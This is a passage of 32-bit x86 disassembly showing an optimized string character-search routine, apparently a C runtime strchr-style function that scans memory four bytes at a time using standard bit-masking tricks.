  428b55:	lea    esp,[esp+0x0]
  428b5c:	lea    esp,[esp+0x0]
  428b60:	xor    eax,eax
  428b62:	mov    al,BYTE PTR [esp+0x8]
  428b66:	push   ebx
  428b67:	mov    ebx,eax
  428b69:	shl    eax,0x8
  428b6c:	mov    edx,DWORD PTR [esp+0x8]
  428b70:	test   edx,0x3
  428b76:	je     0x428b8d
  428b78:	mov    cl,BYTE PTR [edx]
  428b7a:	add    edx,0x1
  428b7d:	cmp    cl,bl
  428b7f:	je     0x428b50
  428b81:	test   cl,cl
  428b83:	je     0x428bd6
  428b85:	test   edx,0x3
  428b8b:	jne    0x428b78
  428b8d:	or     ebx,eax
  428b8f:	push   edi
  428b90:	mov    eax,ebx
  428b92:	shl    ebx,0x10
  428b95:	push   esi
  428b96:	or     ebx,eax
  428b98:	mov    ecx,DWORD PTR [edx]
  428b9a:	mov    edi,0x7efefeff
  428b9f:	mov    eax,ecx
  428ba1:	mov    esi,edi
  428ba3:	xor    ecx,ebx
  428ba5:	add    esi,eax
  428ba7:	add    edi,ecx
  428ba9:	xor    ecx,0xffffffff
  428bac:	xor    eax,0xffffffff
  428baf:	xor    ecx,edi
  428bb1:	xor    eax,esi
  428bb3:	add    edx,0x4
  428bb6:	and    ecx,0x81010100
  428bbc:	jne    0x428bda
  428bbe:	and    eax,0x81010100
  428bc3:	je     0x428b98
  428bc5:	and    eax,0x1010100
  428bca:	jne    0x428bd4
  428bcc:	and    esi,0x80000000
  428bd2:	jne    0x428b98
  428bd4:	pop    esi
  428bd5:	pop    edi
  428bd6:	pop    ebx
  428bd7:	xor    eax,eax
  428bd9:	ret    
  428bda:	mov    eax,DWORD PTR [edx-0x4]
  428bdd:	cmp    al,bl
  428bdf:	je     0x428c17
  428be1:	test   al,al
  428be3:	je     0x428bd4
  428be5:	cmp    ah,bl
  428be7:	je     0x428c10
  428be9:	test   ah,ah
  428beb:	je     0x428bd4
  428bed:	shr    eax,0x10
  428bf0:	cmp    al,bl
  428bf2:	je     0x428c09
  428bf4:	test   al,al
  428bf6:	je     0x428bd4
  428bf8:	cmp    ah,bl
  428bfa:	je     0x428c02
  428bfc:	test   ah,ah
  428bfe:	je     0x428bd4
  428c00:	jmp    0x428b98
  428c02:	pop    esi
  428c03:	pop    edi
  428c04:	lea    eax,[edx-0x1]
  428c07:	pop    ebx
  428c08:	ret    
  428c09:	lea    eax,[edx-0x2]
  428c0c:	pop    esi
  428c0d:	pop    edi
  428c0e:	pop    ebx
  428c0f:	ret    
  428c10:	lea    eax,[edx-0x3]
  428c13:	pop    esi
  428c14:	pop    edi
  428c15:	pop    ebx
  428c16:	ret    
  428c17:	lea    eax,[edx-0x4]
  428c1a:	pop    esi
  428c1b:	pop    edi
  428c1c:	pop    ebx
  428c1d:	ret    
  428c1e:	jmp    DWORD PTR ds:0x429100
